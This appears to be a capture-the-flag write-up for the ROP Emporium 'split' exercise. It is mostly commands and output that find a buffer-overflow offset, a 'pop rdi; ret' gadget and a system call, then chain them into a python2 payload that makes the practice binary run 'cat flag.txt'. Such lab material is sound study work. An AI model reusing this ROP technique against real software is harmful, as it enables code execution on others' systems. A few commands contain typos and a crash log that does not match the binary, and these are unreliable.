# Basic Test:

## Check call system into binary file
```bash
strace ./split
```

## Check protection into binary file
```bash
checksec ./split
```

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*40 + "B"*4*' | ./split
```

## See output
```bash
sudo dmesg -T
```

	[sam. avril  8 13:18:56 2023] split[31929]: segfault at a42424242 ip 0000000042424242 sp 00000000ffed7d00 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)

## Find the a gadget for the parameter

```bash
ROPgadget --binary ./split | grep "pop rdi"
```
 
	0x00000000004007c3 : pop rdi ; ret

## Find the address of the paramater
```bash
rabin2 -z ./split
```

	nth paddr      vaddr      len size section type  string
	―――――――――――――――――――――――――――――――――――――――――――――――――――――――
	0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
	1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
	2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
	3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
	4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
	5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
	0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt

## Find the address of the call system
```bash
pwngdb> disass*usefulFunction
```

	   0x0000000000400742 <+0>:     push   rbp
	   0x0000000000400743 <+1>:     mov    rbp,rsp
	   0x0000000000400746 <+4>:     mov    edi,0x40084a
	   0x000000000040074b <+9>:     call   0x400560 <system@plt>
	   0x0000000000400750 <+14>:    nop
	   0x0000000000400751 <+15>:    pop    rbp
	   0x0000000000400752 <+16>:    ret

## Payload final CLI

```bash
python2 -c 'print "A"*40 + "\xc3\x07\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\x4b\x07\x40\x00\x00\x00\x00\x00"' | ./split # pop rdi; ret = 0x00000000004007c3 + /bin/cat flag.txt = 0x00601060 + system = 0x000000000040074b
```